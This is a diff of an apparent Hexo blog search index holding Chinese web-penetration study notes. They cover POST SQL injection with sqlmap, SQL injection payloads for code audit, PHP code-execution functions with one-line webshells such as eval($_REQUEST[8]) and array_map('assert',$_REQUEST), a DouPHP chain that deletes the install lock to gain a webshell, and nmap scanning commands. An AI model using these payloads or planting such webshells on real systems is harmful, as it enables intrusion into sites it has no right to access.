@@ -520,6 +520,23 @@
       </tags>
   </entry>
   <entry>
+    <title>post注入</title>
+    <url>/2023/08/21/post%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="1-什么是post注入"><a href="#1-什么是post注入" class="headerlink" title="1.什么是post注入?"></a>1.什么是post注入?</h1><p>定义:用户通过post传参的数据被当做sql语句执行的注入(和get注入只有传参方式的不同)</p>
+<p>注意:post传参不受url编码影响</p>
+<h1 id="2-sqlmap跑post注入"><a href="#2-sqlmap跑post注入" class="headerlink" title="2.sqlmap跑post注入"></a>2.sqlmap跑post注入</h1><h2 id="1-第一种方法-—form"><a href="#1-第一种方法-—form" class="headerlink" title="1.第一种方法: —form"></a>1.第一种方法: —form</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;URL&quot;</span> --form   //自动在这个页面上寻找post的传参点</span><br></pre></td></tr></table></figure>
+<h2 id="2-第二种方法-抓包法-r"><a href="#2-第二种方法-抓包法-r" class="headerlink" title="2.第二种方法:抓包法 -r"></a>2.第二种方法:抓包法 -r</h2><p>建议第二种方法,因为:</p>
+<p>(1)可以直接强行制定找到你想要跑的传参[通过在参数结尾加上    *     ]</p>
+<p>(2)可以针对需要权限的注入[比如需要登陆之后才有的页面,获取cookie]</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>msf后渗透</title>
     <url>/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy +  phpmyadmin 4.8.1 </p>
@@ -579,41 +596,6 @@
       </tags>
   </entry>
   <entry>
-    <title>post注入</title>
-    <url>/2023/08/21/post%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="1-什么是post注入"><a href="#1-什么是post注入" class="headerlink" title="1.什么是post注入?"></a>1.什么是post注入?</h1><p>定义:用户通过post传参的数据被当做sql语句执行的注入(和get注入只有传参方式的不同)</p>
-<p>注意:post传参不受url编码影响</p>
-<h1 id="2-sqlmap跑post注入"><a href="#2-sqlmap跑post注入" class="headerlink" title="2.sqlmap跑post注入"></a>2.sqlmap跑post注入</h1><h2 id="1-第一种方法-—form"><a href="#1-第一种方法-—form" class="headerlink" title="1.第一种方法: —form"></a>1.第一种方法: —form</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;URL&quot;</span> --form   //自动在这个页面上寻找post的传参点</span><br></pre></td></tr></table></figure>
-<h2 id="2-第二种方法-抓包法-r"><a href="#2-第二种方法-抓包法-r" class="headerlink" title="2.第二种方法:抓包法 -r"></a>2.第二种方法:抓包法 -r</h2><p>建议第二种方法,因为:</p>
-<p>(1)可以直接强行制定找到你想要跑的传参[通过在参数结尾加上    *     ]</p>
-<p>(2)可以针对需要权限的注入[比如需要登陆之后才有的页面,获取cookie]</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码审计概述</title>
-    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
-    <content><![CDATA[<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="好处"><a href="#好处" class="headerlink" title="好处:"></a>好处:</h2><p>1、可以挖掘到别人黑盒测试不出的漏洞<br>2、白盒测试大多都是CMS或者框架，只要找到一个漏洞就可能可以对成千上万个网站进行攻击。<br>3、会白盒代码审计，是未来的趋势，找工作的加分</p>
-<h2 id="不好"><a href="#不好" class="headerlink" title="不好:"></a>不好:</h2><p>1、费脑子，审计过程中可能得掉头发<br>2、费时间，代码审计需要一定的时间</p>
-<h2 id="代码审计核心"><a href="#代码审计核心" class="headerlink" title="代码审计核心:"></a>代码审计核心:</h2><p>看得懂代码</p>
-<h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法:"></a>基本方法:</h2><h3 id="1-通读全文法"><a href="#1-通读全文法" class="headerlink" title="1.通读全文法"></a>1.通读全文法</h3><p> [从入口文件看，index.php] ,很费时间,需要好几天 </p>
-<h3 id="2-定位危险函数发"><a href="#2-定位危险函数发" class="headerlink" title="2.定位危险函数发"></a>2.定位危险函数发</h3><p>[日常工作中],搜索关键的函数,比如sql注入肯定需要数据库函数支持的;<br>网站要实现功能，都是需要函数的支撑，我们找到函数来审计会比较简单</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id= &#x27; and updatexml(1,concat(&#x27;!&#x27;,database(),1) -- QWEQ</span><br><span class="line"></span><br><span class="line">		get_one(  sql注入的危险函数</span><br><span class="line"></span><br><span class="line">		strpos(&#x27;article&#x27;, &#x27;_category&#x27;) ? &#x27;cat_id&#x27; : &#x27;id&#x27;;</span><br><span class="line"></span><br><span class="line">		三目运算符：</span><br><span class="line"></span><br><span class="line">		条件?成立返回:不成立返回</span><br><span class="line"></span><br><span class="line">		if(length(database())=6,1,sleep(10))</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>
-<h2 id="小偏招"><a href="#小偏招" class="headerlink" title="小偏招"></a>小偏招</h2><p>小偏招，代码运行的时候，去修改代码</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2023/08/21/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1.什么是sql注入"></a>1.什么是sql注入</h1><p>SQL注入：针对网站的一种攻击方式（严重/高危）</p>
@@ -654,31 +636,6 @@
       </categories>
       <tags>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码执行漏洞</title>
-    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="代码执行定义"><a href="#代码执行定义" class="headerlink" title="代码执行定义"></a>代码执行定义</h1><p>用户输入的数据当作后端代码执行,比如&lt;?php eval($_REQUEST[8])?&gt;</p>
-<h1 id="代码执行的危险函数有哪些"><a href="#代码执行的危险函数有哪些" class="headerlink" title="代码执行的危险函数有哪些?"></a>代码执行的危险函数有哪些?</h1><p>​                <strong>eavl</strong>() 可以执行多行代码的代码执行函数<br>​                <strong>assert</strong>() 可执行单行 [如何变多行执行?]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件写入函数：<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;&lt;?php var_dump(8);phpinfo();?&gt;&#x27;</span>);<span class="comment">//把多行的函数用一行的文件写入函数执行</span></span><br></pre></td></tr></table></figure>
-<p>​                <strong>preg_replace</strong>() 可执行单行 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则函数代码执行(也是单行执行的)： </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;abc&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">   		当正则表达式的修饰符为e且正则能匹配到的时候，要替换的内容(新的内容)会被当作代码执行(如果匹配失败则不会!!!)</span><br><span class="line">		当<span class="keyword">eval</span>被过滤了,如果你可以控制正则表达式的修饰符，你也可以拿下目标,正则不可能被禁用</span><br><span class="line">		PHP正则语法  <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/规则/修饰符&#x27;</span>,<span class="string">&#x27;新内容&#x27;</span>,<span class="string">&#x27;原内容&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>​                <strong>create_function</strong>() //匿名函数  [建立函数要写的代码太多了，我偷懒]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">普通函数:<span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span>&#123;要执行的代码&#125;</span><br><span class="line">匿名函数:<span class="title function_ invoke__">create_function</span>(形参,要执行的代码)</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;echo $id;&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); <span class="comment">//执行echo $id;因为$id我传参是8所以 echo $id;</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;$_REQUEST[8];&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); </span><br><span class="line"></span><br><span class="line">当然,如果函数不被调用(即没有<span class="keyword">echo</span><span class="variable">$a</span>(<span class="number">8</span>);),也是可以利用截断法触发代码执行的</span><br><span class="line">	函数不被调用是不会被触发</span><br><span class="line">		<span class="title function_ invoke__">create_function</span>(x,y)<span class="comment">//本质上相当于↓,</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params">x</span>)</span>&#123;y&#125;  </span><br><span class="line">				=&gt; y =  &#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">				=&gt;fuction <span class="title function_ invoke__">XXX</span>(x)&#123;&#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#125;</span></span><br><span class="line">                      所以y可以传这个↑进行截断,不让函数进行调用,直接运行下面的函数</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>
-<p>​                <strong>array_map</strong>(要执行的函数,数组) <strong>回调函数</strong> //[批量调用某个函数]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fuction <span class="title function_ invoke__">cube</span>(<span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//实现了数组$a的元素在函数cube()中的遍历</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意代码具体实现:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//直接?8=phpinfo();   这里$_REQUEST是数组</span></span><br></pre></td></tr></table></figure>
-<p>​                <strong>“${你要执行的代码}”</strong>  <strong>双引号二次解析</strong>/要注意*:不能是传参，只能是写在文件里              必须&gt;PHP5.6的版本才有这个漏洞</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;<span class="string">&quot;;  =&gt; 代码执行phpinfo()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//PHP的字符串是可以使用复杂的表达式。例如 $&#123;中间可以写调用的函数&#125;</span></span><br><span class="line"><span class="string">$&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"><span class="subst">$a</span> = $&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//在PHP的官方文档中也有描述</span></span><br><span class="line"><span class="string">//https://www.php.net/manual/zh/language.types.string.php</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-<h1 id="代码执行经典案例"><a href="#代码执行经典案例" class="headerlink" title="代码执行经典案例"></a>代码执行经典案例</h1><p>dou_phpCMS的安装,通过安装时的数据库信息填写,我们做到了可以拿webshell。但是正常情况下，你不可能直接访问到这个安装</p>
-<p>​    install.lock 存在就不能重装、不存在就可以重装<br>​    找个任意文件名修改漏洞、任意文件删除漏洞。  就可以进入重装页面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">douphp 可以通过任意文件删除漏洞去删除安装锁</span><br><span class="line"></span><br><span class="line"> 		任意文件删除漏洞 【???】</span><br><span class="line"></span><br><span class="line"> 		危险函数定位法。 负责删除文件、文件重命名的函数 PHP</span><br><span class="line"> 			unlink</span><br><span class="line"> 			rename</span><br><span class="line"> 			move_uploaded_file</span><br><span class="line"></span><br><span class="line"> 			unlink(</span><br><span class="line"></span><br><span class="line"> 			$sql_filename = $backup-&gt;is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line">    aaa( -X/E:/phpStudy/WWW/success.php )@qq.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @ unlink(ROOT_PATH . M_PATH . &#x27;/theme/&#x27; . $_CFG[&#x27;mobile_theme&#x27;] . &#x27;/images/&#x27; . $mobile_logo);</span><br><span class="line"></span><br><span class="line">     $mobile_logo = $dou-&gt;get_one(&quot;SELECT value FROM &quot; . $dou-&gt;table(&#x27;config&#x27;) . &quot; WHERE name = &#x27;mobile_logo&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    logo.png =&gt; ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line">    config表里面的name = &#x27;mobile_logo&#x27;的值必须是 ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	foreach ($_REQUEST as $name =&gt; $value)  键值分离   传参名就是键，传参值就是值</span><br><span class="line">		把键和值分来 </span><br><span class="line">		$name 就是键盘，$value就是值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	GET :  8=KKKK</span><br><span class="line">	$_GET =&gt; 预定义数组</span><br><span class="line">	$_GET[8]/$_REQUEST[8] 名字为8的键  8=phpinfo();</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>代码执行</tag>
       </tags>
   </entry>
   <entry>
@@ -960,6 +917,77 @@
       </tags>
   </entry>
   <entry>
+    <title>代码执行漏洞</title>
+    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="代码执行定义"><a href="#代码执行定义" class="headerlink" title="代码执行定义"></a>代码执行定义</h1><p>用户输入的数据当作后端代码执行,比如&lt;?php eval($_REQUEST[8])?&gt;</p>
+<h1 id="代码执行的危险函数有哪些"><a href="#代码执行的危险函数有哪些" class="headerlink" title="代码执行的危险函数有哪些?"></a>代码执行的危险函数有哪些?</h1><p>​                <strong>eavl</strong>() 可以执行多行代码的代码执行函数<br>​                <strong>assert</strong>() 可执行单行 [如何变多行执行?]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件写入函数：<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;&lt;?php var_dump(8);phpinfo();?&gt;&#x27;</span>);<span class="comment">//把多行的函数用一行的文件写入函数执行</span></span><br></pre></td></tr></table></figure>
+<p>​                <strong>preg_replace</strong>() 可执行单行 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则函数代码执行(也是单行执行的)： </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;abc&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">   		当正则表达式的修饰符为e且正则能匹配到的时候，要替换的内容(新的内容)会被当作代码执行(如果匹配失败则不会!!!)</span><br><span class="line">		当<span class="keyword">eval</span>被过滤了,如果你可以控制正则表达式的修饰符，你也可以拿下目标,正则不可能被禁用</span><br><span class="line">		PHP正则语法  <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/规则/修饰符&#x27;</span>,<span class="string">&#x27;新内容&#x27;</span>,<span class="string">&#x27;原内容&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>​                <strong>create_function</strong>() //匿名函数  [建立函数要写的代码太多了，我偷懒]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">普通函数:<span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span>&#123;要执行的代码&#125;</span><br><span class="line">匿名函数:<span class="title function_ invoke__">create_function</span>(形参,要执行的代码)</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;echo $id;&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); <span class="comment">//执行echo $id;因为$id我传参是8所以 echo $id;</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;$_REQUEST[8];&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); </span><br><span class="line"></span><br><span class="line">当然,如果函数不被调用(即没有<span class="keyword">echo</span><span class="variable">$a</span>(<span class="number">8</span>);),也是可以利用截断法触发代码执行的</span><br><span class="line">	函数不被调用是不会被触发</span><br><span class="line">		<span class="title function_ invoke__">create_function</span>(x,y)<span class="comment">//本质上相当于↓,</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params">x</span>)</span>&#123;y&#125;  </span><br><span class="line">				=&gt; y =  &#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">				=&gt;fuction <span class="title function_ invoke__">XXX</span>(x)&#123;&#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#125;</span></span><br><span class="line">                      所以y可以传这个↑进行截断,不让函数进行调用,直接运行下面的函数</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>
+<p>​                <strong>array_map</strong>(要执行的函数,数组) <strong>回调函数</strong> //[批量调用某个函数]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fuction <span class="title function_ invoke__">cube</span>(<span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//实现了数组$a的元素在函数cube()中的遍历</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意代码具体实现:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//直接?8=phpinfo();   这里$_REQUEST是数组</span></span><br></pre></td></tr></table></figure>
+<p>​                <strong>“${你要执行的代码}”</strong>  <strong>双引号二次解析</strong>/要注意*:不能是传参，只能是写在文件里              必须&gt;PHP5.6的版本才有这个漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;<span class="string">&quot;;  =&gt; 代码执行phpinfo()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//PHP的字符串是可以使用复杂的表达式。例如 $&#123;中间可以写调用的函数&#125;</span></span><br><span class="line"><span class="string">$&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"><span class="subst">$a</span> = $&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//在PHP的官方文档中也有描述</span></span><br><span class="line"><span class="string">//https://www.php.net/manual/zh/language.types.string.php</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<h1 id="代码执行经典案例"><a href="#代码执行经典案例" class="headerlink" title="代码执行经典案例"></a>代码执行经典案例</h1><p>dou_phpCMS的安装,通过安装时的数据库信息填写,我们做到了可以拿webshell。但是正常情况下，你不可能直接访问到这个安装</p>
+<p>​    install.lock 存在就不能重装、不存在就可以重装<br>​    找个任意文件名修改漏洞、任意文件删除漏洞。  就可以进入重装页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">douphp 可以通过任意文件删除漏洞去删除安装锁</span><br><span class="line"></span><br><span class="line"> 		任意文件删除漏洞 【???】</span><br><span class="line"></span><br><span class="line"> 		危险函数定位法。 负责删除文件、文件重命名的函数 PHP</span><br><span class="line"> 			unlink</span><br><span class="line"> 			rename</span><br><span class="line"> 			move_uploaded_file</span><br><span class="line"></span><br><span class="line"> 			unlink(</span><br><span class="line"></span><br><span class="line"> 			$sql_filename = $backup-&gt;is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line">    aaa( -X/E:/phpStudy/WWW/success.php )@qq.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @ unlink(ROOT_PATH . M_PATH . &#x27;/theme/&#x27; . $_CFG[&#x27;mobile_theme&#x27;] . &#x27;/images/&#x27; . $mobile_logo);</span><br><span class="line"></span><br><span class="line">     $mobile_logo = $dou-&gt;get_one(&quot;SELECT value FROM &quot; . $dou-&gt;table(&#x27;config&#x27;) . &quot; WHERE name = &#x27;mobile_logo&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    logo.png =&gt; ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line">    config表里面的name = &#x27;mobile_logo&#x27;的值必须是 ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	foreach ($_REQUEST as $name =&gt; $value)  键值分离   传参名就是键，传参值就是值</span><br><span class="line">		把键和值分来 </span><br><span class="line">		$name 就是键盘，$value就是值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	GET :  8=KKKK</span><br><span class="line">	$_GET =&gt; 预定义数组</span><br><span class="line">	$_GET[8]/$_REQUEST[8] 名字为8的键  8=phpinfo();</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计概述</title>
+    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="好处"><a href="#好处" class="headerlink" title="好处:"></a>好处:</h2><p>1、可以挖掘到别人黑盒测试不出的漏洞<br>2、白盒测试大多都是CMS或者框架，只要找到一个漏洞就可能可以对成千上万个网站进行攻击。<br>3、会白盒代码审计，是未来的趋势，找工作的加分</p>
+<h2 id="不好"><a href="#不好" class="headerlink" title="不好:"></a>不好:</h2><p>1、费脑子，审计过程中可能得掉头发<br>2、费时间，代码审计需要一定的时间</p>
+<h2 id="代码审计核心"><a href="#代码审计核心" class="headerlink" title="代码审计核心:"></a>代码审计核心:</h2><p>看得懂代码</p>
+<h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法:"></a>基本方法:</h2><h3 id="1-通读全文法"><a href="#1-通读全文法" class="headerlink" title="1.通读全文法"></a>1.通读全文法</h3><p> [从入口文件看，index.php] ,很费时间,需要好几天 </p>
+<h3 id="2-定位危险函数发"><a href="#2-定位危险函数发" class="headerlink" title="2.定位危险函数发"></a>2.定位危险函数发</h3><p>[日常工作中],搜索关键的函数,比如sql注入肯定需要数据库函数支持的;<br>网站要实现功能，都是需要函数的支撑，我们找到函数来审计会比较简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id= &#x27; and updatexml(1,concat(&#x27;!&#x27;,database(),1) -- QWEQ</span><br><span class="line"></span><br><span class="line">		get_one(  sql注入的危险函数</span><br><span class="line"></span><br><span class="line">		strpos(&#x27;article&#x27;, &#x27;_category&#x27;) ? &#x27;cat_id&#x27; : &#x27;id&#x27;;</span><br><span class="line"></span><br><span class="line">		三目运算符：</span><br><span class="line"></span><br><span class="line">		条件?成立返回:不成立返回</span><br><span class="line"></span><br><span class="line">		if(length(database())=6,1,sleep(10))</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+<h2 id="小偏招"><a href="#小偏招" class="headerlink" title="小偏招"></a>小偏招</h2><p>小偏招，代码运行的时候，去修改代码</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网信息收集(Nmap与Hydra)</title>
+    <url>/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/</url>
+    <content><![CDATA[<p>官方脚本：<br><a href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a><br>CVE查询：<br><a href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a><br><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p>
+<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>一 、检测存活在网络上的主机（主机发现）<br>二、 检测主机上开放的端口（端口发现或枚举）<br>三、 检测到相应的端口（服务发现）的软件和版本<br>四、 检测操作系统，硬件地址，以及软件版本<br>五、 检测脆弱性的漏洞（Nmap的脚本）</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>-sS :     TCP SYN扫描<br>-p:         指定端口号扫描<br>-v：      显示扫描过程<br>-F：    快速扫描<br>-Pn：   禁止ping后扫描: 跳过主机发现的过程进行端口扫描<br>-A：     全面的系统扫描:包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</p>
+<h2 id="扫描指定IP开放端口命令"><a href="#扫描指定IP开放端口命令" class="headerlink" title="扫描指定IP开放端口命令:"></a>扫描指定IP开放端口命令:</h2><p>nmap –sS -p 端口号 -v 192.168.1.2<br>使用半开放扫描，指定端口号1-65535，显示扫描过程</p>
+<h2 id="穿透防火墙扫描命令："><a href="#穿透防火墙扫描命令：" class="headerlink" title="穿透防火墙扫描命令："></a>穿透防火墙扫描命令：</h2><p>nmap –Pn/P0 -A 192.168.1.2<br>服务器禁止ping命令，试试-Pn，nmap参数配合使用</p>
+<h2 id="常用的端口扫描指令"><a href="#常用的端口扫描指令" class="headerlink" title="常用的端口扫描指令"></a>常用的端口扫描指令</h2><p>-sU :        UDP扫描（不可靠）<br>-sT:          TCP扫描<br>-sV：        扫描系统版本和程序版本检测<br>-T4：        默认3，越高扫描越快，但也容易被防火墙或IDS检测并屏蔽掉<br>-R:        反向域名解析<br>-sL—script=vuln     扫描常见的漏洞</p>
+<h2 id="漏洞扫描命令"><a href="#漏洞扫描命令" class="headerlink" title="漏洞扫描命令:"></a>漏洞扫描命令:</h2><p>nmap —script=vuln 192.168.1.2<br>使用vuln脚本进行常见的漏洞扫描</p>
+<h2 id="指纹识别扫描命令："><a href="#指纹识别扫描命令：" class="headerlink" title="指纹识别扫描命令："></a>指纹识别扫描命令：</h2><p>nmap -sV -v 192.168.1.2<br>扫描系统和程序版本号检测，并且输出详细信息</p>
+<h2 id="端口扫描的状态"><a href="#端口扫描的状态" class="headerlink" title="端口扫描的状态"></a>端口扫描的状态</h2><p>Opend：端口开启<br>Closed：  端口关闭<br>Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙拦截了<br>Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态<br>Open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中<br>Closed|filtered：关闭或者被过滤，只发生在IP ID idle扫描</p>
